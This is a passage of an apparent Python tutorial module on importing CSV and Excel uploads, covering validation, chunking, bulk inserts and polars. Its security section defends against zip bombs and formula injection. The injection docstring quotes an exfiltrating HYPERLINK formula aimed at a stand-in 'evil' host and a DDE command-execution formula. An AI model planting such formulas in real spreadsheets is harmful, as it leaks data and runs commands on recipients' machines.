    byte value maps to a codepoint.  The result may be mojibake, but a garbled
    preview the user can act on beats a 500 with no information.

    Args:
        raw: Complete file contents.

    Returns:
        A DataFrame, or None if pandas is missing.

    Raises:
        ValueError: if every encoding in the ladder fails.
    """
    pd = _require_pandas("read_with_encoding_fallback")
    if pd is None:
        return None

    last_error: Optional[Exception] = None
    for enc in ENCODING_LADDER:
        try:
            df = pd.read_csv(
                io.BytesIO(raw), dtype=str, encoding=enc,
                keep_default_na=False, na_values=[""], engine="python",
                on_bad_lines="skip",
            )
            df.columns = [normalise_header(c) for c in df.columns]
            log.info("Decoded upload as %s", enc)
            return df
        except UnicodeDecodeError as exc:
            last_error = exc
            continue
    raise ValueError(
        f"Could not decode the file; please re-save it as UTF-8 CSV ({last_error})"
    )


# ==========================================================================
# 9. PANDAS — vectorised validation with row-level reporting
# ==========================================================================
# df.iterrows() over 100k rows is a genuine performance bug, not a style nit:
# it boxes every row into a fresh Series.  Boolean masks are 10-100x faster
# and read better.


def attach_user_row_numbers(df: Any, line_numbers: Optional[Sequence[int]] = None) -> Any:
    """
    Pin the user-facing line number onto the frame as a '_row' column.

    Two strategies:
      - With `line_numbers` from scan_delimited_file(): exact, and correct
        even when records span multiple physical lines or bad lines were
        skipped.  Always prefer this.
      - Without it: the df.index + 2 approximation (+1 for the 0-based index,
        +1 for the header line).  Correct only when nothing was skipped and
        no field contains an embedded newline.

    The column must be attached IMMEDIATELY after reading.  Once you filter,
    dropna, or drop_duplicates, positional information is gone forever — but
    '_row' rides along untouched.

    Args:
        df:           The freshly read DataFrame.
        line_numbers: Exact physical line numbers, one per row, in order.

    Returns:
        The same DataFrame with a '_row' column.
    """
    if line_numbers is not None and len(line_numbers) == len(df):
        df["_row"] = list(line_numbers)
    else:
        if line_numbers is not None:
            log.warning(
                "Line-number count (%d) != row count (%d); falling back to index+2",
                len(line_numbers), len(df),
            )
        df["_row"] = df.index + 2
    return df


def make_error_collector(df: Any, report: ImportReport) -> Callable[[Any, str, str], None]:
    """
    Build a `collect(mask, column, message)` closure bound to a frame+report.

    `mask` is a boolean Series where True means INVALID.  One RowError is
    emitted per offending row, carrying the user-facing line number from
    '_row' and the offending value.

    Usage:
        collect = make_error_collector(df, report)
        collect(df["email"].isna(), "email", "required")

    Args:
        df:     DataFrame that already has a '_row' column.
        report: Accumulator.

    Returns:
        The collector function.
    """
    def collect(mask: Any, column: str, message: str) -> None:
        if column not in df.columns:
            return
        offenders = df.loc[mask.fillna(False), ["_row", column]]
        for row_no, value in zip(offenders["_row"], offenders[column]):
            report.add_error(RowError(
                row=int(row_no),
                column=column,
                value="" if value is None else str(value),
                message=message,
            ))

    return collect


def validate_dataframe(df: Any, report: ImportReport) -> Any:
    """
    Run the whole validation suite as vectorised masks.

    Returns a frame of only the valid rows, with typed columns added
    (quantity_int, unit_price_minor, invoice_date_parsed).

    Every check follows the same shape:
        1. compute a boolean mask where True == invalid
        2. hand it to collect() for per-row reporting
        3. OR it into a running `bad` mask
    Then drop `bad` once, at the end.  One pass, no Python-level loop over
    rows, and full row-level error detail.

    Args:
        df:     DataFrame with a '_row' column, all columns string dtype.
        report: Accumulator for RowErrors.

    Returns:
        The subset of `df` that passed every check (or None without pandas).
    """
    pd = _require_pandas("validate_dataframe")
    if pd is None:
        return None

    collect = make_error_collector(df, report)
    bad = pd.Series(False, index=df.index)

    # ---- 0. drop the trailing summary row before it fails five checks ----
    if "sku" in df.columns and "email" in df.columns:
        summary_mask = (
            df["sku"].fillna("").str.strip().str.lower().isin(SUMMARY_ROW_MARKERS)
            & (df["email"].fillna("").str.strip() == "")
        )
        if summary_mask.any():
            for row_no in df.loc[summary_mask, "_row"]:
                report.warnings.append(
                    f"Line {int(row_no)} looks like a summary/TOTAL row — skipped"
                )
            df = df.loc[~summary_mask].copy()
            bad = pd.Series(False, index=df.index)
            collect = make_error_collector(df, report)

    report.total_rows = len(df)

    # ---- 1. whitespace / NBSP normalisation across every text column ----
    text_cols = [c for c in df.columns if c != "_row"]
    for col in text_cols:
        df[col] = (
            df[col].fillna("")
                   .astype(str)
                   .str.replace(_NBSP, " ", regex=False)
                   .str.replace(r"\s+", " ", regex=True)
                   .str.strip()
        )

    # ---- 2. required fields ----
    for col in ("sku", "product_name", "email"):
        if col in df.columns:
            mask = df[col] == ""
            collect(mask, col, "required")
            bad |= mask

    # ---- 3. email format ----
    if "email" in df.columns:
        mask = (df["email"] != "") & ~df["email"].str.match(EMAIL_RE.pattern, na=False)
        collect(mask, "email", "not a valid email")
        bad |= mask

        # ---- 4. in-file duplicates (case-insensitive) ----
        lowered = df["email"].str.lower()
        dup = lowered.duplicated(keep="first") & (df["email"] != "")
        collect(dup, "email", "duplicate in file")
        bad |= dup

    # ---- 5. quantity: numeric, integral, positive ----
    if "quantity" in df.columns:
        qty = pd.to_numeric(
            df["quantity"].str.replace(",", "", regex=False), errors="coerce"
        )
        not_numeric = qty.isna() & (df["quantity"] != "")
        collect(not_numeric, "quantity", "must be a whole number")
        bad |= not_numeric

        missing_qty = df["quantity"] == ""
        collect(missing_qty, "quantity", "required")
        bad |= missing_qty

        non_integral = qty.notna() & (qty != qty.round())
        collect(non_integral, "quantity", "must be whole, not a fraction")
        bad |= non_integral

        non_positive = qty.notna() & (qty <= 0)
        collect(non_positive, "quantity", "must be greater than zero")
        bad |= non_positive

        # to_numeric returns float64 whenever a NaN is present, so 3 becomes
        # 3.0 and lands in the DB as a float.  Int64 (capital I — the nullable
        # integer dtype) keeps integers integral AND allows missing values.
        df["quantity_int"] = qty.round().astype("Int64")

    # ---- 6. money: strip symbols/separators, handle (123.45) negatives ----
    if "unit_price" in df.columns:
        cleaned = (
            df["unit_price"]
            .str.replace(r"[₹$€£¥,\s]", "", regex=True)
            .str.replace(r"^\((.*)\)$", r"-\1", regex=True)   # (500) → -500
        )
        price = pd.to_numeric(cleaned, errors="coerce")

        unparsable = price.isna() & (df["unit_price"] != "")
        collect(unparsable, "unit_price", "not a valid amount")
        bad |= unparsable

        negative = price.notna() & (price < 0)
        collect(negative, "unit_price", "must not be negative")
        bad |= negative

        # Vectorised float is fine for the CHECK; the stored value goes
        # through Decimal → integer minor units, never float.
        df["unit_price_minor"] = (price * 100).round().astype("Int64")

    # ---- 7. dates: pinned format, coerce failures to NaT, report them ----
    if "invoice_date" in df.columns:
        parsed = pd.to_datetime(df["invoice_date"], format="%d/%m/%Y", errors="coerce")
        # Second chance for ISO-style values in the same column.
        retry = parsed.isna() & (df["invoice_date"] != "")
        if retry.any():
            parsed = parsed.fillna(
                pd.to_datetime(df.loc[retry, "invoice_date"],
                               format="%Y-%m-%d", errors="coerce")
            )
        unparsable = parsed.isna()
        collect(unparsable, "invoice_date", "expected DD/MM/YYYY")
        bad |= unparsable
        df["invoice_date_parsed"] = parsed

    clean = df.loc[~bad].copy()
    report.valid_rows = len(clean)
    return clean


# ==========================================================================
# 10. MEMORY — measuring it, and the levers that move it
# ==========================================================================


def dataframe_memory_mb(df: Any) -> float:
    """
    Actual memory footprint of a DataFrame, in MB.

    deep=True is essential: without it, an object column reports only the
    8-byte pointer per row, not the Python string objects those pointers
    reference.  The difference is routinely 10x.

    Rule of thumb for string-heavy CSV: the DataFrame is 5-10x the FILE size,
    because every Python str carries ~49 bytes of object overhead plus the
    pointer indirection.  A 200 MB CSV can be 1.5 GB in RAM.
    """
    if df is None:
        return 0.0
    return float(df.memory_usage(deep=True).sum()) / 1024 ** 2


def demo_memory_levers(df: Any) -> Dict[str, float]:
    """
    Measure the three memory levers side by side on a real frame.

      usecols   — never materialise columns you will not read.  Biggest win.
      category  — low-cardinality strings stored as int8 codes + one index.
                  10-50x on such a column.  BUT it BACKFIRES on high
                  cardinality (emails, UUIDs): you then store the codes AND
                  the full unique index, using MORE memory than plain strings.
      pyarrow   — dtype_backend="pyarrow" gives Arrow-backed strings with far
                  less per-value overhead than object dtype.

    Args:
        df: A string-dtype DataFrame.

    Returns:
        {label: megabytes}
    """
    pd = _require_pandas("demo_memory_levers")
    if pd is None or df is None:
        return {}

    results = {"baseline_object_dtype": dataframe_memory_mb(df)}

    if "status" in df.columns:
        as_category = df.copy()
        as_category["status"] = as_category["status"].astype("category")
        results["status_as_category"] = dataframe_memory_mb(as_category)

    if "email" in df.columns:
        # Deliberate anti-example: high-cardinality column as category.
        bad_category = df.copy()
        bad_category["email"] = bad_category["email"].astype("category")
        results["email_as_category_ANTIPATTERN"] = dataframe_memory_mb(bad_category)

    subset_cols = [c for c in ("sku", "quantity") if c in df.columns]
    if subset_cols:
        results["usecols_subset"] = dataframe_memory_mb(df[subset_cols])

    return results


# ==========================================================================
# 11. CHUNKED PROCESSING — constant peak memory for big files
# ==========================================================================


def import_csv_chunked(
    path: str,
    chunk_size: int = 50_000,
    encoding: str = "utf-8-sig",
    sink: Optional[Callable[[List[Dict[str, Any]]], None]] = None,
    progress: Optional[Callable[[int, int], None]] = None,
) -> ImportReport:
    """
    Import a large CSV chunk by chunk.  Peak memory is ONE chunk, not one file.

    Key subtleties:
      - `chunksize` turns read_csv into an ITERATOR of DataFrames.
      - The DataFrame index is GLOBAL and continuous across chunks by default,
        so `index + 2` stays correct for row numbering across the whole file.
      - Cross-chunk duplicate detection needs state YOU carry (a set of seen
        keys) — or a UNIQUE constraint in the DB doing the work for you.
      - Committing per chunk means a crash leaves a PARTIAL import.  Record
        `last_committed_chunk` on the job row so you can resume or clean up.
      - Chunk size trades memory against round trips; 10k-50k rows is the
        usual sweet spot.

    Args:
        path:       CSV to import.
        chunk_size: Rows per chunk.
        encoding:   Text encoding.
        sink:       Receives each batch of dict records (simulates the DB).
        progress:   Called as progress(rows_processed, chunk_index).

    Returns:
        An aggregated ImportReport, or an empty one if pandas is missing.
    """
    pd = _require_pandas("import_csv_chunked")
    report = ImportReport()
    if pd is None:
        return report

    seen_emails: Set[str] = set()   # cross-chunk state

    reader = pd.read_csv(
        path,
        dtype=str,
        keep_default_na=False,
        na_values=[""],
        encoding=encoding,
        engine="python",
        chunksize=chunk_size,
        on_bad_lines="skip",        # exact line numbers come from the pre-scan
    )

    for chunk_no, chunk in enumerate(reader):
        chunk.columns = [normalise_header(c) for c in chunk.columns]
        chunk = attach_user_row_numbers(chunk)   # index is global → still right

        chunk_report = ImportReport()
        clean = validate_dataframe(chunk, chunk_report)

        # Cross-chunk dedupe: the per-chunk duplicated() check cannot see
        # earlier chunks, so we filter against carried state here.
        if clean is not None and "email" in clean.columns:
            lowered = clean["email"].str.lower()
            already = lowered.isin(seen_emails)
            for row_no, value in zip(clean.loc[already, "_row"],
                                     clean.loc[already, "email"]):
                chunk_report.add_error(RowError(
                    int(row_no), "email", str(value),
                    "duplicate — seen in an earlier chunk of this file",
                ))
            clean = clean.loc[~already]
            seen_emails.update(lowered[~already].tolist())

        report.total_rows += chunk_report.total_rows
        report.valid_rows += len(clean) if clean is not None else 0
        report.error_count += chunk_report.error_count
        for err in chunk_report.errors:
            if len(report.errors) < MAX_INLINE_ERRORS:
                report.errors.append(err)
        report.warnings.extend(chunk_report.warnings)

        if sink and clean is not None and len(clean):
            sink(dataframe_to_records(clean))

        if progress:
            progress(report.total_rows, chunk_no)

        # Explicit: in a long-lived worker, chained assignment leaves old
        # frames referenced.  Dropping the name lets the allocator reuse it.
        del chunk, clean

    return report


# ==========================================================================
# 12. HANDOFF TO THE ORM — to_dict("records") → bulk insert
# ==========================================================================


def dataframe_to_records(df: Any, columns: Optional[Sequence[str]] = None) -> List[Dict[str, Any]]:
    """
    Convert a validated DataFrame into ORM-ready dicts.

    TWO TRAPS live in this one line, and both bite in production:

    1. NaN IS A FLOAT, NOT None.
       Inserted into a nullable text column it becomes the string "nan" or
       raises a driver error.  `df.astype(object).where(df.notna(), None)` is
       the reliable conversion — `.replace({np.nan: None})` has been
       inconsistent across pandas versions and is deprecated for this use.

    2. NUMPY SCALARS ARE NOT PYTHON SCALARS.
       np.int64 / np.float64 / pd.Timestamp confuse some DBAPI drivers.
       .astype(object) plus .to_pydatetime() for datetime columns keeps the
       payload boring.

    Args:
        df:      Validated DataFrame.
        columns: Restrict/reorder the output keys.

    Returns:
        list[dict] — one dict per row, ready for executemany / bulk_create.
    """
    pd = _require_pandas("dataframe_to_records")
    if pd is None or df is None:
        return []

    out = df[list(columns)] if columns else df

    # Trap 1: NaN/NaT → None, across every dtype.
    out = out.astype(object).where(out.notna(), None)

    records: List[Dict[str, Any]] = out.to_dict("records")

    # Trap 2: unbox numpy/pandas scalars into plain Python types.
    for record in records:
        for key, value in record.items():
            if hasattr(value, "to_pydatetime"):
                record[key] = value.to_pydatetime()
            elif hasattr(value, "item"):          # np.int64, np.float64, np.bool_
                record[key] = value.item()
    return records


def batched(records: Sequence[Dict[str, Any]], batch_size: int = 1000) -> Iterator[List[Dict[str, Any]]]:
    """
    Yield fixed-size batches from a record list.

    CHOOSING batch_size:
      - Too small  → round-trip overhead dominates.
      - Too large  → one enormous statement, longer locks, no progress
                     granularity, and you hit Postgres' hard cap of 65,535
                     BIND PARAMETERS per statement.  The real constraint is
                     `rows * columns < 65535`, so with 8 columns the ceiling
                     is ~8100 rows.
      - 500-2000 rows is the usual answer.
    """
    for start in range(0, len(records), batch_size):
        yield list(records[start : start + batch_size])


def max_safe_batch_size(n_columns: int, param_limit: int = 65_535) -> int:
    """Largest batch that stays under the driver's bind-parameter ceiling."""
    if n_columns <= 0:
        return param_limit
    return max(1, param_limit // n_columns)


def bulk_insert_sqlalchemy(records: Sequence[Dict[str, Any]], batch_size: int = 1000) -> int:
    """
    SQLAlchemy 2.x bulk insert pattern (illustrative — no live DB here).

    `session.execute(insert(Model), list_of_dicts)` uses EXECUTEMANY: one
    round trip per batch instead of one per row.  Avoid `session.add_all()`
    for imports — it builds N Python model objects and one giant flush.

    Args:
        records:    ORM-ready dicts from dataframe_to_records().
        batch_size: Rows per statement.

    Returns:
        Number of rows that would be inserted.
    """
    try:
        from sqlalchemy import insert  # type: ignore  # noqa: F401
    except ImportError:
        warnings.warn(
            "sqlalchemy not installed — showing the pattern only. "
            "Run: pip install sqlalchemy",
            ImportWarning,
            stacklevel=2,
        )

    # ---- The real thing (uncomment with a live session + Model) ----
    #
    # from sqlalchemy import insert
    # for batch in batched(records, batch_size):
    #     session.execute(insert(Product), batch)
    # session.commit()
    #
    # Upsert on Postgres:
    #
    # from sqlalchemy.dialects.postgresql import insert as pg_insert
    # for batch in batched(records, batch_size):
    #     stmt = pg_insert(Product).values(batch)
    #     stmt = stmt.on_conflict_do_update(
    #         index_elements=["sku"],
    #         set_={"name": stmt.excluded.name, "price": stmt.excluded.price},
    #     )
    #     session.execute(stmt)
    # session.commit()

    total = 0
    for batch in batched(records, batch_size):
        log.debug("Would INSERT %d rows", len(batch))
        total += len(batch)
    return total


def bulk_insert_django(records: Sequence[Dict[str, Any]], batch_size: int = 1000) -> int:
    """
    Django bulk_create pattern (illustrative — no Django app configured here).

    ```python
    objs = [Product(**r) for r in records]
    Product.objects.bulk_create(objs, batch_size=1000)

    # Django 4.1+: real upsert
    Product.objects.bulk_create(
        objs, batch_size=1000,
        update_conflicts=True,
        update_fields=["name", "price"],
        unique_fields=["sku"],
    )
    ```

    CAVEAT: bulk_create skips save(), pre_save/post_save signals, and
    auto_now/auto_now_add.  If your model depends on those, compute the values
    in the data-prep step instead of relying on the ORM.
    """
    total = 0
    for batch in batched(records, batch_size):
        log.debug("Would bulk_create %d objects", len(batch))
        total += len(batch)
    return total


def copy_from_stdin_postgres(df: Any, table: str, columns: Sequence[str]) -> str:
    """
    Build the COPY FROM STDIN payload — 5-10x faster than executemany.

    For 1M+ rows, COPY is the right tool.  The DataFrame is serialised to an
    in-memory TSV (tab avoids most quoting), NULLs are written as \\N, and the
    server ingests the stream in one statement.

    Real usage:
        raw_conn = engine.raw_connection()
        with raw_conn.cursor() as cur:
            cur.copy_expert(sql, buf)
        raw_conn.commit()

    Note: `df.to_sql(..., method="multi")` exists but is generally SLOWER than
    a plain executemany and far slower than COPY.

    Args:
        df:      Validated DataFrame.
        table:   Target table name.
        columns: Column order for the COPY statement.

    Returns:
        The COPY SQL statement that would be executed.
    """
    pd = _require_pandas("copy_from_stdin_postgres")
    if pd is None or df is None:
        return ""

    buf = io.StringIO()
    df[list(columns)].to_csv(buf, index=False, header=False, sep="\t", na_rep="\\N")
    buf.seek(0)

    sql = (
        f"COPY {table} ({', '.join(columns)}) "
        f"FROM STDIN WITH (FORMAT csv, DELIMITER E'\\t', NULL '\\\\N')"
    )
    log.info("COPY payload prepared: %d bytes", len(buf.getvalue()))
    return sql


# ==========================================================================
# 13. EXCEL — there is no chunksize, so stream with openpyxl
# ==========================================================================
# pip install openpyxl        (or: pip install python-calamine — 5-20x faster)


def read_excel_safely(source: Any, sheet_name: Any = 0, usecols: Optional[str] = None) -> Any:
    """
    Read an .xlsx with the same defensive defaults as read_csv_safely.

    Engine choice:
      openpyxl  — default, pure Python, memory-hungry
      calamine  — Rust-backed (pip install python-calamine), 5-20x faster and
                  far less RAM; also reads legacy .xls and .ods.  The 2026
                  default for anything non-trivial.
      xlrd      — .xls ONLY (xlsx support removed in xlrd 2.0)

    Args:
        source:     Path or file-like object.
        sheet_name: int index, sheet name, list, or None for ALL sheets (dict).
        usecols:    Excel range like "A:F" or a list of names.

    Returns:
        A DataFrame, or None if pandas/openpyxl are missing.
    """
    pd = _require_pandas("read_excel_safely")
    if pd is None:
        return None

    engine = "openpyxl"
    try:
        import python_calamine  # type: ignore  # noqa: F401

        engine = "calamine"
    except ImportError:
        pass

    try:
        return pd.read_excel(
            source,
            sheet_name=sheet_name,
            dtype=str,
            engine=engine,
            keep_default_na=False,
            na_values=[""],
            usecols=usecols,
        )
    except ImportError:
        warnings.warn(
            "No xlsx engine installed. Run: pip install openpyxl "
            "(or: pip install python-calamine for a much faster reader)",
            ImportWarning,
            stacklevel=2,
        )
        return None


def stream_excel_rows(path: str, sheet_index: int = 0, batch_size: int = 50_000) -> Iterator[List[tuple]]:
    """
    Stream an .xlsx sheet in batches without loading it all into memory.

    WHY THIS EXISTS: pd.read_excel has NO `chunksize`.  An .xlsx is a zipped
    XML tree — you cannot seek to row 500,000.  read_excel materialises the
    whole sheet, so a 500 MB workbook needs many gigabytes.

    openpyxl's read_only mode uses a streaming XML parser and yields rows
    lazily at roughly constant memory.  data_only=True returns the CACHED
    result of formula cells (None if the file was never opened in Excel —
    a real trap: a freshly generated workbook has no cached values).

    The three production options, in order of preference:
      1. Ask for CSV instead of Excel for bulk imports.
      2. Convert xlsx → CSV/Parquet once, then chunk normally.
      3. This function.

    Args:
        path:        Path to the .xlsx.
        sheet_index: Which sheet to stream.
        batch_size:  Rows per yielded batch.

    Yields:
        Lists of row tuples.  Yields nothing if openpyxl is unavailable.
    """
    try:
        from openpyxl import load_workbook  # type: ignore
    except ImportError:
        warnings.warn(
            "openpyxl not installed — skipping Excel streaming. "
            "Run: pip install openpyxl",
            ImportWarning,
            stacklevel=2,
        )
        return

    wb = load_workbook(path, read_only=True, data_only=True)
    try:
        ws = wb.worksheets[sheet_index]
        batch: List[tuple] = []
        for row in ws.iter_rows(values_only=True):
            batch.append(row)
            if len(batch) >= batch_size:
                yield batch
                batch = []
        if batch:
            yield batch
    finally:
        # read_only workbooks hold an open file handle until closed.
        wb.close()


EXCEL_GOTCHAS = """
Sanity checks worth running on any Excel upload BEFORE trusting it:

  HEADER NOT ON ROW 1
      Users put a title, a logo, or a date in the first rows.  Detect the
      real header (first row where >80% of cells are non-empty strings) or
      pass skiprows=N.

  MERGED CELLS
      Only the top-left cell holds the value; the rest read as None.  A
      merged "Region" label spanning 5 rows gives you 1 value and 4 nulls.
      openpyxl exposes ws.merged_cells.ranges — forward-fill them explicitly.

  FORMULA CELLS
      data_only=True returns the cached value, which is None if the file was
      generated programmatically and never opened in Excel.
      #REF!, #DIV/0!, #N/A arrive as STRINGS — they must FAIL validation,
      not quietly become NaN.

  HIDDEN SHEETS / HIDDEN ROWS
      sheet_name=0 reads the first sheet, which may be a hidden template.
      Enumerate wb.sheetnames and check ws.sheet_state == 'visible'.

  TRAILING TOTALS ROW
      "TOTAL" in column A with sums across — not data.  Detect and skip, and
      tell the user you skipped it.

  NUMBERS STORED AS TEXT
      Excel's green-triangle warning.  With dtype=str you get the text and
      coerce it yourself, which is exactly what you want.

  DATES AS SERIAL NUMBERS
      45301 rather than 2024-01-05.  Days since 1899-12-30 (the 1900
      leap-year bug means the epoch is the 30th, not the 31st).
"""


# ==========================================================================
# 14. POLARS — the 2026 alternative
# ==========================================================================
# pip install "polars>=1.0"


def import_with_polars(path: str, batch_size: int = 50_000) -> Optional[int]:
    """
    The same import, in polars — lazy, streaming, and strict by default.

    Why it wins for backend import work:
      MEMORY   Arrow-backed strings, no per-value Python object.  Typically
               2-5x less RAM than pandas object dtype.
      SPEED    Rust core, multithreaded, 3-10x faster on large CSV.
      LAZY     scan_csv() builds a plan; collect(streaming=True) never
               materialises the whole file.  Predicate/projection pushdown
               means a filter or a column selection is applied DURING the
               read, not after.
      STRICT   Schema violations RAISE by default instead of coercing
               silently — the opposite of the pandas trap this file opens on.

    When to actually switch: files consistently > 500 MB, a memory-constrained
    worker, or you want loud failures.  For a 5 MB contacts CSV, pandas is
    fine and the team already knows it.  Note also that pandas 2.x with
    dtype_backend="pyarrow" closes much of the memory gap without a rewrite.

    Args:
        path:       CSV to read.
        batch_size: Rows per slice handed to the sink.

    Returns:
        Number of rows processed, or None if polars is unavailable.
    """
    try:
        import polars as pl  # type: ignore
    except ImportError:
        warnings.warn(
            'polars not installed — skipping. Run: pip install "polars>=1.0"',
            ImportWarning,
            stacklevel=2,
        )
        return None

    # infer_schema_length=0 is the polars equivalent of pandas' dtype=str:
    # read every column as Utf8 and coerce deliberately afterwards.
    lazy = pl.scan_csv(
        path,
        infer_schema_length=0,
        null_values=[""],
        encoding="utf8-lossy",           # never raises on a bad byte
        ignore_errors=True,              # tolerate malformed values
        truncate_ragged_lines=True,      # tolerate the extra-field row
    )

    # Expression API: trim every column without naming any of them.  Because
    # this is LAZY, the trim is fused into the read — polars does not build an
    # intermediate frame the way `df[col] = df[col].str.strip()` does.
    lazy = lazy.with_columns(pl.all().str.strip_chars())

    # For a genuinely large file: lazy.collect(streaming=True), which never
    # materialises the whole frame.  Kept eager here so the demo works on
    # every polars version.
    frame = lazy.collect()

    processed = 0
    for slice_ in frame.iter_slices(batch_size):
        records = slice_.to_dicts()      # same handoff shape as pandas
        processed += len(records)
    return processed


POLARS_VS_PANDAS = """
                        pandas                    polars
------------------------------------------------------------------------
Big CSV read            baseline                  3-10x faster, 2-5x less RAM
Excel                   native (openpyxl)         read_excel via calamine
Type handling           coerces silently          raises on mismatch
Lazy / streaming        no                        scan_csv + collect(streaming=True)
Missing values          NaN (a float!)            null (a real null)
API                     positional-ish, .loc      expression-based, composable
Ecosystem               enormous                  growing; Arrow interop
Team familiarity        universal                 still a learning curve
"""


# ==========================================================================
# 15. SECURITY — zip bombs, CSV injection, DoS caps
# ==========================================================================

MAX_UNCOMPRESSED_BYTES = 2 * 1024 ** 3      # 2 GB
MAX_COMPRESSION_RATIO = 100                 # 100:1 is already suspicious
MAX_COLUMNS = 512
MAX_ROWS = 5_000_000


def check_xlsx_zip_bomb(path: str) -> Tuple[bool, str]:
    """
    Reject an .xlsx whose declared uncompressed size is absurd.

    An .xlsx IS a zip archive.  A 1 MB upload can declare 10 GB of contents;
    naive extraction fills the disk or the heap.  The zip CENTRAL DIRECTORY
    carries each entry's uncompressed size, so we can check WITHOUT extracting
    anything.  (A crafted archive can lie about the size, so also cap the
    bytes you actually read during extraction.)

    Args:
        path: Path to the uploaded .xlsx.

    Returns:
        (is_safe, reason)
    """
    import zipfile

    try:
        with zipfile.ZipFile(path) as zf:
            uncompressed = sum(info.file_size for info in zf.infolist())
            compressed = sum(info.compress_size for info in zf.infolist()) or 1
    except zipfile.BadZipFile:
        return False, "not a valid .xlsx (bad zip archive)"

    if uncompressed > MAX_UNCOMPRESSED_BYTES:
        return False, f"uncompressed size {uncompressed} exceeds the limit"

    ratio = uncompressed / compressed
    if ratio > MAX_COMPRESSION_RATIO:
        return False, f"suspicious compression ratio {ratio:.0f}:1"

    return True, "ok"


_INJECTION_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitise_for_csv_export(value: Any) -> str:
    """
    Neutralise CSV/formula injection when writing user data back out.

    A cell whose text begins with =, +, -, @, TAB or CR is interpreted as a
    FORMULA when the export is opened in Excel or Sheets.
    `=HYPERLINK("http://evil/?"&A1,"Click")` exfiltrates the neighbouring
    cell; `=cmd|'/c calc'!A0` has historically executed commands.

    OWASP's remediation is to prefix the cell with a single quote, which Excel
    treats as "this is text".

    Args:
        value: Any cell value about to be written to CSV/XLSX.

    Returns:
        A safe string.
    """
    text = "" if value is None else str(value)
    if text.startswith(_INJECTION_PREFIXES):
        return "'" + text
    return text


def enforce_shape_limits(n_rows: int, n_columns: int) -> Tuple[bool, str]:
    """
    Cap rows AND columns.  Everyone remembers rows; columns are the sneaky one.

    A CSV with 100,000 columns and 10 rows is tiny on disk and explodes any
    DataFrame (pandas allocates per column).  Cap both.
    """
    if n_columns > MAX_COLUMNS:
        return False, f"{n_columns} columns exceeds the limit of {MAX_COLUMNS}"
    if n_rows > MAX_ROWS:
        return False, f"{n_rows} rows exceeds the limit of {MAX_ROWS}"
    return True, "ok"


# ==========================================================================
# 16. THE ENDPOINT — what the API layer actually looks like
# ==========================================================================

ENDPOINT_PATTERN = '''
# pip install fastapi uvicorn celery

@app.post("/imports", status_code=202)
async def create_import(file: UploadFile = File(...), user=Depends(get_user)):
    """
    Accept an upload and QUEUE it.  Never parse in the request handler:
      - parsing is CPU-bound and blocks the async event loop
      - it is unbounded in time; the client times out at 30s and retries,
        and now two imports of the same file are running
    """
    # 1. Cheap rejections first — before a single row is read.
    if not file.filename.lower().endswith((".csv", ".xlsx")):
        raise HTTPException(415, "Upload a .csv or .xlsx file")

    # 2. Stream to storage with a hard byte cap (see file 01).
    key, size, sha256 = await stream_to_storage(file, max_bytes=200 * 1024 * 1024)

    # 3. Idempotency: the same bytes from the same user within the window
    #    return the EXISTING job instead of importing twice.  This is what
    #    saves you from the double-click.
    existing = await db.find_import_by_hash(user.id, sha256, within_hours=24)
    if existing:
        return {"job_id": existing.id, "status": existing.status, "deduplicated": True}

    # 4. Create the job row, enqueue, return immediately.
    job = await db.create_import_job(user.id, key, size, sha256, status="queued")
    process_import.delay(str(job.id))
    return {"job_id": job.id, "status": "queued"}


@app.get("/imports/{job_id}")
async def import_status(job_id: UUID, user=Depends(get_user)):
    """Poll target for the UI progress bar (or push via SSE/websocket)."""
    return await db.get_import_job(job_id, user.id)
    # -> {status, processed_rows, total_rows, valid_rows, error_count,
    #     error_report_url, last_committed_batch}


@celery.task(bind=True, max_retries=3)
def process_import(self, job_id: str):
    """
    The worker.  Streams, validates, bulk-inserts, and records progress.

    Operational notes:
      - worker_max_tasks_per_child so a pandas memory leak cannot take the
        pool down over time
      - last_committed_batch on the job row makes retries resumable
      - the full error list goes to S3 as a CSV; only a head is inlined
    """
    job = db.get_import_job(job_id)
    db.update_job(job_id, status="processing")
    try:
        report = import_csv_chunked(
            download_to_tmp(job.storage_key),
            chunk_size=50_000,
            sink=lambda batch: bulk_insert_sqlalchemy(batch, batch_size=1000),
            progress=lambda rows, chunk: db.update_job(
                job_id, processed_rows=rows, last_committed_batch=chunk),
        )
        url = upload_error_csv(report, job_id) if report.error_count else None
        db.update_job(job_id, status="done" if report.ok else "completed_with_errors",
                      **report.as_dict(error_report_url=url))
    except Exception as exc:
        db.update_job(job_id, status="failed", error=str(exc))
        raise self.retry(exc=exc, countdown=60)
'''


IMPORT_MODES = """
All-or-nothing vs partial import — DECIDE AND DOCUMENT IT:

  STRICT       Any error → import nothing.  Right for financial data and
               ledgers.  Implementation: partial mode inside one transaction
               that rolls back when errors is non-empty.

  PARTIAL      Insert the valid rows, return a CSV of the rest.  Right for
               contact lists and product catalogues where 4987 of 5000 rows
               is a useful outcome.

  DRY-RUN      POST /imports?validate_only=true returns the error report
               without writing; a second call commits.  Best UX, and the mode
               to build if you can only build one — the other two fall out of
               it as flags.
"""


# ==========================================================================
# 17. PITFALLS CATALOGUE
# ==========================================================================

PITFALLS = """
1. pd.read_csv(f) WITH NO ARGUMENTS
   Type inference mangles IDs, PIN codes, and phone numbers silently.
   "007" -> 7.  A 20-digit account number -> float64 -> WRONG DIGITS, no
   exception.  Always dtype=str, then coerce explicitly.

2. df.iterrows() FOR VALIDATION
   Boxes every row into a fresh Series.  100k rows: seconds instead of
   milliseconds.  Use boolean masks.

3. REPORTING THE DATAFRAME INDEX AS THE ROW NUMBER
   Off by one (header), off by more once rows are skipped, and wrong entirely
   when a quoted field contains a newline.  Pin '_row' right after reading —
   ideally from a stdlib pre-scan that knows the real line numbers.

4. PARSING INSIDE THE HTTP REQUEST
   CPU-bound work on the event loop.  Request times out, user retries, two
   imports now run concurrently.  Queue it.

5. FLOAT FOR MONEY
   0.1 + 0.2 != 0.3.  Decimal, or integer minor units.

6. COMMITTING PER ROW
   50,000 transactions instead of 50.  Batch it.

7. TRUSTING NaN TO BECOME NULL
   NaN is a FLOAT.  It arrives in the DB as the string "nan" or raises.
   Convert with .astype(object).where(df.notna(), None).

8. FULL ERROR LIST IN THE JSON RESPONSE
   A wrong file yields 500k errors and a multi-MB response body.  Cap the
   inline list; offer a CSV download.

9. NO IDEMPOTENCY
   User double-clicks Upload -> duplicate rows.  Hash the file content and
   return the existing job for a repeat hash.

10. FORGETTING THE SECOND SHEET
    sheet_name=0 reads only the first.  If the data is on "Sheet2" you import
    0 rows and report success.  Enumerate the sheets and say what you used.

